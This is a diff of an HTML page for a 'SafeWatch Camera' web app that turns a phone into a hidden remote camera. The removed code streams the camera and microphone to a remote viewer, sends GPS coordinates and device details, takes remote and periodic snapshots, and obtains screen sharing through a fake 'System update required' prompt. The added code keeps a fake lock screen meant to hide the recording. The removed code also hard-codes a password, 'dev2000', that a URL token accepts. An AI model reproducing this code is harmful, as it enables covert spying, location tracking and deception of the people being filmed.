@@ -3,12 +3,12 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SafeWatch Camera</title>
-    <link rel="stylesheet" href="css/style.css?v=4.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SafeWatch Camera | v4.0</title>
+    <link rel="stylesheet" href="css/style.css?v=5.0">
     <link rel="manifest" href="manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="theme-color" content="#0f172a">
+    <meta name="theme-color" content="#000000">
     <script src="/socket.io/socket.io.js"></script>
     <style>
         body,
@@ -16,6 +16,7 @@
             height: 100%;
             overflow: hidden;
             background: black;
+            margin: 0;
         }
 
         #localVideo {
@@ -24,706 +25,138 @@
             object-fit: cover;
         }
 
-        .monitor-status {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.6);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
-            z-index: 10;
-        }
-
+        /* Stealth Mode Overlay */
         #dim-overlay {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.8s;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: black;
-            opacity: 0;
-            pointer-events: none;
-            /* Let clicks pass through if needed, or handle taps to wake */
-            z-index: 999;
-            transition: opacity 0.5s;
+            background: #000;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 60px 20px;
+            color: white;
+            font-family: -apple-system, sans-serif;
+        }
+
+        #dim-overlay.active {
+            opacity: 1;
+            pointer-events: all;
         }
     </style>
 </head>
 
 <body>
-    <!-- Authentication & Auto-Login Logic -->
-    <div id="monitor-login-gate" class="login-overlay" style="display: none;">
-        <div class="login-card">
-            <ion-icon name="lock-closed"
-                style="font-size: 4rem; color: var(--primary); margin-bottom: 20px;"></ion-icon>
-            <h2>تأمين الكاميرا</h2>
-            <p style="color: var(--text-muted); margin-top: 10px;">أدخل كلمة المرور لتنشيط الكاميرا</p>
-            <input type="password" id="m-pass" class="login-input" placeholder="كلمة المرور">
-            <button onclick="checkMonitorPass()" class="btn" style="width: 100%;">تنشيط</button>
+    <!-- Permission Gate -->
+    <div id="permission-overlay" class="login-overlay" style="z-index: 20000;">
+        <div class="login-card" style="max-width: 450px;">
+            <div
+                style="width: 80px; height: 80px; background: rgba(59, 130, 246, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                <ion-icon name="shield-checkmark" style="font-size: 3rem; color: var(--primary);"></ion-icon>
+            </div>
+            <h2 style="margin-bottom: 10px;">تنشيط الكاميرا المباشرة</h2>
+            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px;">للبدء، يرجى الضغط على الزر
+                أدناه ثم السماح بالوصول للكاميرا والميكروفون.</p>
+            <button id="start-btn" class="btn" style="width: 100%;">تنشيط النظام الآن</button>
         </div>
     </div>
 
-    <script>
-        (function () {
-            const urlParams = new URLSearchParams(window.location.search);
-            const token = urlParams.get('token');
+    <!-- Main View -->
+    <video id="localVideo" autoplay playsinline muted webkit-playsinline></video>
 
-            // Auto-auth if token matches
-            if (token === 'dev2000') {
-                localStorage.setItem('sw_auth', 'true');
-            }
-
-            // Verify auth
-            window.addEventListener('load', () => {
-                if (localStorage.getItem('sw_auth') !== 'true') {
-                    document.getElementById('monitor-login-gate').style.display = 'flex';
-                }
-            });
-        })();
-
-        function checkMonitorPass() {
-            const pass = document.getElementById('m-pass').value;
-            if (pass === 'dev2000') {
-                localStorage.setItem('sw_auth', 'true');
-                document.getElementById('monitor-login-gate').style.display = 'none';
-                startSystem(); // Re-trigger startup
-            } else {
-                alert("كلمة مرو خاطئة!");
-            }
-        }
-    </script>
-
-    <div id="permission-overlay"
-        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20000; text-align: center; padding: 20px;">
-        <div
-            style="background: rgba(255,255,255,0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); max-width: 400px; width: 90%; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);">
-            <div style="position: relative; width: 80px; height: 80px; margin: 0 auto 25px;">
-                <ion-icon name="shield-checkmark" style="font-size: 5rem; color: #3b82f6;"></ion-icon>
+    <!-- Stealth Mode UI (Fake Lock Screen) -->
+    <div id="dim-overlay" onclick="handleWake(event)">
+        <div style="width: 100%; display: flex; justify-content: space-between; align-items: center; opacity: 0.8;">
+            <div style="display: flex; align-items: center; gap: 5px; font-size: 0.8rem;">
+                <span>SafeNet</span> <ion-icon name="wifi"></ion-icon>
+            </div>
+            <div style="display: flex; align-items: center; gap: 6px; font-size: 0.8rem;">
+                <span id="lock-battery">100%</span>
                 <div
-                    style="position: absolute; top: -5px; right: -5px; width: 25px; height: 25px; background: #ef4444; border-radius: 50%; border: 3px solid #0f172a; animation: pulse 1.5s infinite;">
+                    style="width: 22px; height: 11px; border: 1px solid rgba(255,255,255,0.4); border-radius: 2px; padding: 1px;">
+                    <div id="battery-fill" style="height: 100%; width: 100%; background: white;"></div>
                 </div>
             </div>
-            <h2 style="margin-bottom: 15px; font-weight: 700; font-size: 1.5rem;">تأمين الاتصال المباشر</h2>
-            <p style="margin-bottom: 25px; font-size: 1rem; color: #94a3b8; line-height: 1.6;">
-                للبدء، يرجى الضغط على <strong>"تنشيط الآن"</strong> ثم اختيار <strong>"سماح"</strong> في نافذة المتصفح
-                التي ستظهر للأمان.
-            </p>
-            <button id="start-btn" class="btn"
-                style="background: #3b82f6; border: none; padding: 18px 0; width: 100%; border-radius: 15px; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: transform 0.2s;">
-                تنشيط النظام والبدء
-            </button>
-            <div style="margin-top: 20px; font-size: 0.8rem; color: #64748b;">
-                <ion-icon name="lock-closed-outline" style="vertical-align: middle;"></ion-icon>
-                اتصال مشفر وآمن بالكامل
+        </div>
+
+        <div style="text-align: center;">
+            <div id="lock-time" style="font-size: 5rem; font-weight: 200;">12:00</div>
+            <div id="lock-date" style="font-size: 1.2rem; opacity: 0.8;">الأحد، 1 يناير</div>
+        </div>
+
+        <div style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 30px;">
+            <div style="display: flex; gap: 50px;">
+                <div
+                    style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+                    <ion-icon name="flashlight" style="font-size: 1.4rem;"></ion-icon>
+                </div>
+                <div
+                    style="width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+                    <ion-icon name="camera" style="font-size: 1.4rem;"></ion-icon>
+                </div>
+            </div>
+            <div style="font-size: 0.8rem; opacity: 0.4;">
+                <div
+                    style="width: 80px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 0 auto 15px;">
+                </div>
+                اضغط مرتين لإلغاء التخفي
             </div>
         </div>
     </div>
 
-    <!-- Added webkit-playsinline for iOS compatibility -->
-    <video id="localVideo" autoplay playsinline webkit-playsinline muted
-        style="width: 100%; height: 100%; object-fit: cover;"></video>
-
-    <!-- Debug Log Container -->
-    <div id="debug-log"
-        style="position: absolute; top: 10px; left: 10px; z-index: 5000; color: #0f0; font-size: 10px; background: rgba(0,0,0,0.7); max-height: 200px; overflow-y: auto; pointer-events: none; text-align: left; direction: ltr; display: none;">
-        Log started...<br>
-    </div>
-
-    <!-- Restart Button -->
-    <button id="restart-cam-btn"
-        style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10000; background: #ef4444; color: white; border: none; padding: 25px 45px; border-radius: 20px; font-size: 1.3rem; display: none; cursor: pointer; box-shadow: 0 10px 30px rgba(239, 68, 68, 0.5); font-weight: bold;">
-        <ion-icon name="videocam-off-outline" style="vertical-align: middle; margin-left: 10px;"></ion-icon>
-        تنشيط الكاميرا يدوياً (Autoplay)
-    </button>
-
-    <div class="monitor-status" id="status-text" style="transition: opacity 0.5s; display: none;"></div>
-
-    <div id="dim-overlay"
-        style="opacity: 0; pointer-events: none; transition: opacity 0.5s; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: rgba(255,255,255,0.7); font-family: sans-serif; user-select: none;">
-        <div
-            style="position: absolute; top: 20px; right: 20px; display: flex; align-items: center; gap: 5px; font-size: 0.9rem;">
-            <span id="lock-battery">--%</span>
-            <ion-icon name="battery-half"></ion-icon>
-        </div>
-
-        <div id="lock-time" style="font-size: 5rem; font-weight: 200; color: white;">12:00</div>
-        <div id="lock-date" style="font-size: 1.2rem; margin-top: -10px;">الأحد، 1 يناير</div>
-
-        <div style="position: absolute; bottom: 50px; font-size: 0.9rem; opacity: 0.5; animation: pulse 2s infinite;">
-            <ion-icon name="finger-print" style="font-size: 2rem; display: block; margin: 0 auto 10px;"></ion-icon>
-            اضغط مرتين لفتح القفل
-        </div>
-    </div>
-
-    <style>
-        @keyframes pulse {
-            0% {
-                opacity: 0.3;
-            }
-
-            50% {
-                opacity: 0.7;
-            }
-
-            100% {
-                opacity: 0.3;
-            }
-        }
-    </style>
-
+    <!-- Scripts -->
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
-    <script>
-        // Log function for on-screen debugging
-        function log(msg) {
-            console.log(msg);
-            const d = document.getElementById('debug-log');
-            d.innerHTML += msg + "<br>";
-            d.scrollTop = d.scrollHeight;
-        }
+    <script type="module">
+        import { Core } from './js/core.js';
+        import { MonitorSystem } from './js/monitor.js';
 
-        const socket = io();
-        const urlParams = new URLSearchParams(window.location.search);
-        const roomId = urlParams.get('session');
-        const localVideo = document.getElementById('localVideo');
-        const permissionOverlay = document.getElementById('permission-overlay');
-        const dimOverlay = document.getElementById('dim-overlay');
-        const statusText = document.getElementById('status-text');
-        const restartBtn = document.getElementById('restart-cam-btn');
+        const roomId = Core.getRoomId();
+        let system = null;
 
-        let peerConnection;
-        let localStream;
-        let currentFacingMode = 'environment';
-        let wakeLock = null;
-        let errorCount = 0;
+        document.getElementById('start-btn').onclick = () => {
+            document.getElementById('permission-overlay').style.display = 'none';
+            system = new MonitorSystem(roomId);
 
-        const config = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' }
-            ]
+            // Keep screen on
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen').catch(() => { });
+            }
         };
 
-        if (!roomId) {
-            alert('No Session ID');
-            window.location.href = '/';
-        }
+        // Stealth Mode Helpers
+        window.toggleStealthMode = () => {
+            document.getElementById('dim-overlay').classList.toggle('active');
+            updateClock();
+        };
 
-        restartBtn.addEventListener('click', async () => {
-            restartBtn.style.display = 'none';
-            log("User clicked Force Start");
-            // Must call play() directly in user event
-            if (localVideo.srcObject) {
-                try {
-                    await localVideo.play();
-                    log("Video playing after manual click!");
-                    log("Camera active.");
-                    if (statusText.innerHTML.includes("وضع التوافق")) {
-                        startCanvasStreaming();
-                    }
-                } catch (e) {
-                    log("Manual play failed: " + e.message);
-                }
-            } else {
-                await getCamera(currentFacingMode);
-            }
-        });
+        let lastTap = 0;
+        window.handleWake = (e) => {
+            const now = Date.now();
+            if (now - lastTap < 300) window.toggleStealthMode();
+            lastTap = now;
+        };
 
-        // 1. Wake Lock (Keep Screen Alive)
-        async function requestWakeLock() {
-            try {
-                wakeLock = await navigator.wakeLock.request('screen');
-                log('Wake Lock is active!');
-            } catch (err) {
-                log(`${err.name}, ${err.message}`);
-            }
-        }
-
-        document.addEventListener('visibilitychange', async () => {
-            if (wakeLock !== null && document.visibilityState === 'visible') {
-                await requestWakeLock();
-            }
-        });
-
-        let autoStartTimer;
-        async function startSystem() {
-            if (autoStartTimer) clearTimeout(autoStartTimer);
-            log("Starting system sequence...");
-
-            try {
-                // Ensure auth is cleared before trying
-                if (localStorage.getItem('sw_auth') !== 'true') {
-                    const token = new URLSearchParams(window.location.search).get('token');
-                    if (token === 'dev2000') {
-                        localStorage.setItem('sw_auth', 'true');
-                        document.getElementById('monitor-login-gate').style.display = 'none';
-                    } else {
-                        throw new Error("Missing Authentication");
-                    }
-                }
-
-                // Attempt to get camera
-                const stream = await getCamera(currentFacingMode);
-
-                if (stream) {
-                    await requestWakeLock(); // Keep screen on
-                    permissionOverlay.style.display = 'none';
-                    socket.emit('join-room', roomId, 'monitor');
-                    sendDeviceInfo();
-                    log("Monitor Active & Streaming.");
-
-                    // Verify video is playing
-                    setTimeout(() => {
-                        if (localVideo.paused || localVideo.readyState < 2) {
-                            log("Video paused/not ready. Showing force start.");
-                            restartBtn.style.display = 'block';
-                        } else {
-                            // Auto-lock only if all good
-                            toggleStealthMode();
-                            log("Stealth Mode Auto-Activated.");
-                        }
-                    }, 4000);
-                }
-            } catch (e) {
-                log("Startup blocked: " + e.message);
-                if (e.message === "Missing Authentication") {
-                    document.getElementById('monitor-login-gate').style.display = 'flex';
-                } else {
-                    permissionOverlay.style.display = 'flex';
-                    restartBtn.style.display = 'block';
-                }
-            }
-        }
-
-        // 2. Custom Permission Button Handler
-        document.getElementById('start-btn').addEventListener('click', () => {
-            log("Button clicked, triggering startSystem...");
-            // Change text to loading
-            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync" class="pulsing"></ion-icon> جاري التشغيل...';
-            startSystem();
-        });
-
-        // Auto-run on load (will work if permissions already granted)
-        window.addEventListener('load', () => {
-            log("Initial load check...");
-            // Small delay to ensure everything is ready
-            autoStartTimer = setTimeout(startSystem, 800);
-        });
-
-        async function getScreen() {
-            // Browsers REQUIRE a physical gesture to start Screen Sharing.
-            // We will show an "Urgent Update" or "System Notification" style button.
-            log("Screen capture requested. Showing permission prompt on device.");
-
-            const prompt = document.createElement('div');
-            prompt.id = "screen-prompt";
-            prompt.style = "position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px;";
-            prompt.innerHTML = `
-                <ion-icon name="shield-checkmark" style="font-size: 4rem; color: #3b82f6; margin-bottom: 20px;"></ion-icon>
-                <h2>تحديث النظام مطلوب</h2>
-                <p style="margin-bottom: 30px; color: #94a3b8;">يرجى الضغط على الزر أدناه لتفعيل وضع المراقبة المتقدمة والموافقة على الطلب الذي سيظهر.</p>
-                <button id="activate-screen-btn" style="background: #3b82f6; border: none; padding: 15px 40px; border-radius: 50px; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer;">تحديث وتنشيط الآن</button>
-            `;
-            document.body.appendChild(prompt);
-
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-                alert("للأسف، هذا المتصفح على الجوال لا يدعم ميزة بث الشاشة. يرجى استخدام متصفح Chrome محدث.");
-                log("Screen sharing not supported on this browser.");
-                return;
-            }
-
-            document.getElementById('activate-screen-btn').addEventListener('click', async () => {
-                try {
-                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    log("Screen stream acquired!");
-                    prompt.remove();
-
-                    const screenTrack = screenStream.getVideoTracks()[0];
-
-                    // Critical: Update Local Video
-                    localVideo.srcObject = screenStream;
-                    await localVideo.play().catch(e => log("Play screen error: " + e.message));
-
-                    if (peerConnection) {
-                        const senders = peerConnection.getSenders();
-                        for (const sender of senders) {
-                            if (sender.track && sender.track.kind === 'video') {
-                                await sender.replaceTrack(screenTrack);
-                                log("Replaced video track for PC.");
-                            }
-                        }
-                    }
-
-                    screenTrack.onended = () => {
-                        log("Screen ended.");
-                        getCamera(currentFacingMode);
-                    };
-                } catch (e) {
-                    log("Screen capture failed: " + e.message);
-                    alert("بث الشاشة غير مدعوم أو تم رفضه: " + e.message);
-                    prompt.remove();
-                }
-            });
-        }
-
-        async function getCamera(facingMode = 'environment') {
-            log(`Getting camera (${facingMode})...`);
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                log("Browser does not support camera access (ensure HTTPS).");
-                statusText.innerText = "المتصفح لا يدعم الوصول للكاميرا (تأكد من HTTPS).";
-                return;
-            }
-
-            try {
-                if (localStream) {
-                    log("Stopping existing stream tracks.");
-                    localStream.getTracks().forEach(track => track.stop());
-                }
-
-                log("Requesting Audio + Video...");
-                let stream;
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: facingMode,
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
-                        audio: true
-                    });
-                } catch (audioErr) {
-                    log("Audio+Video failed, trying Video-Only: " + audioErr.message);
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: facingMode,
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
-                        audio: false
-                    });
-                }
-
-                log("Stream acquired. Tracks: " + stream.getTracks().length);
-
-                localStream = stream;
-                localVideo.srcObject = stream;
-
-                // Explicitly try to play
-                try {
-                    await localVideo.play();
-                    log("Video.play() success");
-                    restartBtn.style.display = 'none';
-                } catch (e) {
-                    log("Autoplay blocked: " + e.message);
-                    restartBtn.style.display = 'block';
-                    // If blocked, we MUST NOT hide the permission overlay yet or the user won't know
-                    permissionOverlay.style.display = 'flex';
-                }
-
-                // Refresh connection if active
-                if (peerConnection) {
-                    log("Peer connection active, replacing video track.");
-                    const videoTrack = stream.getVideoTracks()[0];
-                    const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
-                    if (sender) sender.replaceTrack(videoTrack);
-                }
-
-                return stream;
-            } catch (err) {
-                log("Camera Critical Error: " + err.message);
-
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError' || err.name === 'NotFoundError') {
-                    permissionOverlay.style.display = 'flex';
-                    // Show a specific error message in the overlay if possible? 
-                    // For now, the user sees the professional overlay.
-                }
-
-                restartBtn.style.display = 'block';
-                return null;
-            }
-        }
-
-        // Socket Events
-        let iceCandidatesQueue = [];
-
-        socket.on('offer', async (payload) => {
-            console.log("Received Offer");
-            log("Connection established. Streaming live...");
-            // Removed visible status text for stealth
-
-            peerConnection = new RTCPeerConnection(config);
-
-            localStream.getTracks().forEach(track => {
-                peerConnection.addTrack(track, localStream);
-            });
-
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    socket.emit('ice-candidate', { roomId, candidate: event.candidate });
-                }
-            };
-
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(payload.sdp));
-
-            while (iceCandidatesQueue.length > 0) {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(iceCandidatesQueue.shift()));
-            }
-
-            const answer = await peerConnection.createAnswer();
-            await peerConnection.setLocalDescription(answer);
-
-            socket.emit('answer', { roomId, sdp: answer });
-
-            startBatteryUpdates();
-        });
-
-        socket.on('ice-candidate', async (payload) => {
-            if (peerConnection && peerConnection.remoteDescription) {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(payload.candidate));
-            } else {
-                iceCandidatesQueue.push(payload.candidate);
-            }
-        });
-
-        socket.on('control-command', async (payload) => {
-            console.log("Command received:", payload.command);
-
-            const videoTrack = localStream ? localStream.getVideoTracks()[0] : null;
-
-            if (payload.command === 'switch-camera') {
-                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-                await getCamera(currentFacingMode);
-            }
-
-            if (payload.command === 'switch-to-screen') {
-                await getScreen();
-            }
-
-            if (payload.command === 'toggle-torch') {
-                if (videoTrack) {
-                    const capabilities = videoTrack.getCapabilities();
-                    if (capabilities.torch) {
-                        try {
-                            const currentSettings = videoTrack.getSettings();
-                            await videoTrack.applyConstraints({ advanced: [{ torch: !currentSettings.torch }] });
-                        } catch (e) {
-                            log("Torch error: " + e.message);
-                        }
-                    } else {
-                        log("Torch not supported on this camera/device.");
-                        // Removed status text notification to stay hidden
-                    }
-                }
-            }
-
-            if (payload.command === 'set-zoom') {
-                if (videoTrack) {
-                    const capabilities = videoTrack.getCapabilities();
-                    if (capabilities.zoom) {
-                        try {
-                            await videoTrack.applyConstraints({ advanced: [{ zoom: payload.value }] });
-                        } catch (e) {
-                            log("Zoom error: " + e.message);
-                        }
-                    }
-                }
-            }
-
-            if (payload.command === 'screen-dim') {
-                toggleStealthMode();
-            }
-            if (payload.command === 'start-compatibility-mode') {
-                // Determine speed based on payload
-                const interval = payload.interval || 100; // Default 100ms (Video-like)
-                startCanvasStreaming(interval);
-            }
-            if (payload.command === 'stop-compatibility-mode') {
-                stopCanvasStreaming();
-            }
-
-            // New Commands
-            if (payload.command === 'capture-photo') {
-                sendSingleSnapshot("التقاط صورة يدوية...");
-            }
-            if (payload.command === 'set-auto-snapshot') {
-                setupAutoSnapshot(payload.enabled, payload.minutes);
-            }
-        });
-
-        // Helper: Stealth Mode (Fake Lock Screen)
-        function toggleStealthMode() {
-            const isHidden = dimOverlay.style.opacity === '1';
-
-            if (isHidden) {
-                // Unlock
-                dimOverlay.style.opacity = '0';
-                dimOverlay.style.pointerEvents = 'none';
-            } else {
-                // Lock (Fake Screen)
-                updateClock();
-                dimOverlay.style.opacity = '1';
-                dimOverlay.style.pointerEvents = 'all';
-            }
-        }
-
-        // Clock Logic for Fake Lock Screen
         function updateClock() {
             const now = new Date();
-            const time = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false });
-            const date = now.toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long' });
+            document.getElementById('lock-time').innerText = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' });
+            document.getElementById('lock-date').innerText = now.toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long' });
 
-            document.getElementById('lock-time').innerText = time;
-            document.getElementById('lock-date').innerText = date;
-        }
-
-        setInterval(updateClock, 60000); // 1 min update
-
-        // Unlock on double tap or swipe logic (simplified to double click for web)
-        dimOverlay.addEventListener('dblclick', () => {
-            toggleStealthMode();
-        });
-
-        // Battery Status for Lock Screen
-        navigator.getBattery?.().then(b => {
-            const updateBat = () => {
-                document.getElementById('lock-battery').innerText = Math.round(b.level * 100) + '%';
-            };
-            updateBat();
-            b.addEventListener('levelchange', updateBat);
-        });
-
-        // --- SNAPSHOT / COMPATIBILITY MODE ---
-        let canvasInterval = null;
-        let autoSnapshotTimer = null; // Persistent timer for periodic shots
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-
-        function sendSingleSnapshot(msg) {
-            if (localVideo.readyState >= 2) {
-                canvas.width = 1280; // High res for manual photos
-                canvas.height = 720;
-                ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
-                const data = canvas.toDataURL('image/jpeg', 0.8);
-                socket.emit('stream-data', { roomId, image: data, isSnapshot: true });
-                log(msg);
-            }
-        }
-
-        function setupAutoSnapshot(enabled, minutes) {
-            if (autoSnapshotTimer) clearInterval(autoSnapshotTimer);
-            if (enabled) {
-                const ms = minutes * 60 * 1000;
-                autoSnapshotTimer = setInterval(() => {
-                    sendSingleSnapshot("إرسال لقطة دورية تلقائية...");
-                }, ms);
-                log(`Auto-snapshot enabled: every ${minutes} mins`);
-            } else {
-                log("Auto-snapshot disabled.");
-            }
-        }
-
-        function startCanvasStreaming(intervalMs) {
-            if (canvasInterval) clearInterval(canvasInterval);
-
-            const isSnapshot = intervalMs > 1000;
-            log(isSnapshot ? "Snapshot mode active" : "Compatibility mode active");
-
-            canvas.width = 640;
-            canvas.height = 480;
-
-            canvasInterval = setInterval(async () => {
-                try {
-                    if (localVideo.readyState >= 2) {
-                        ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
-                        const quality = isSnapshot ? 0.6 : 0.3; // Higher quality for slow snapshots
-                        const data = canvas.toDataURL('image/jpeg', quality);
-                        socket.emit('stream-data', { roomId, image: data });
-                    } else {
-                        localVideo.play().catch(e => { });
-                    }
-                } catch (e) {
-                    console.error(e);
-                }
-            }, intervalMs);
-        }
-
-        function stopCanvasStreaming() {
-            if (canvasInterval) {
-                clearInterval(canvasInterval);
-                canvasInterval = null;
-                log("Compatibility mode stopped.");
-            }
-        }
-
-        // Expose for debugging if needed
-        window.sendTestFrame = () => {
-            canvas.width = 320;
-            canvas.height = 240;
-            ctx.fillStyle = "red";
-            ctx.fillRect(0, 0, 320, 240);
-            ctx.fillStyle = "white";
-            ctx.font = "30px Arial";
-            ctx.fillText("TEST FRAME", 50, 120);
-            const data = canvas.toDataURL('image/jpeg', 0.5);
-            socket.emit('stream-data', { roomId, image: data });
-            alert("تم إرسال صورة حمراء اختبارية. تحقق من الشاشة الأخرى.");
-        };
-
-        async function sendDeviceInfo() {
-            let location = { lat: 'غير متاح', lon: 'غير متاح' };
-
-            // Try to get GPS Location
-            if ("geolocation" in navigator) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-                    });
-                    location.lat = position.coords.latitude;
-                    location.lon = position.coords.longitude;
-                } catch (e) {
-                    log("Location access denied or timeout.");
-                }
-            }
-
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                cores: navigator.hardwareConcurrency || 'N/A',
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
-                connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
-                location: location,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            socket.emit('device-info', { roomId, info });
-            log("Detailed device info & GPS sent.");
-        }
-
-        // Battery API
-        function startBatteryUpdates() {
             if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    sendBattery(battery);
-                    battery.addEventListener('levelchange', () => sendBattery(battery));
-                    battery.addEventListener('chargingchange', () => sendBattery(battery));
+                navigator.getBattery().then(b => {
+                    const l = Math.round(b.level * 100);
+                    document.getElementById('lock-battery').innerText = l + '%';
+                    document.getElementById('battery-fill').style.width = l + '%';
                 });
-            } else {
-                console.log("Battery API not supported on this device.");
             }
         }
-
-        function sendBattery(battery) {
-            const level = Math.round(battery.level * 100);
-            socket.emit('status-update', {
-                roomId,
-                type: 'battery',
-                level: level,
-                charging: battery.charging
-            });
-        }
+        setInterval(updateClock, 10000);
     </script>
 </body>
 
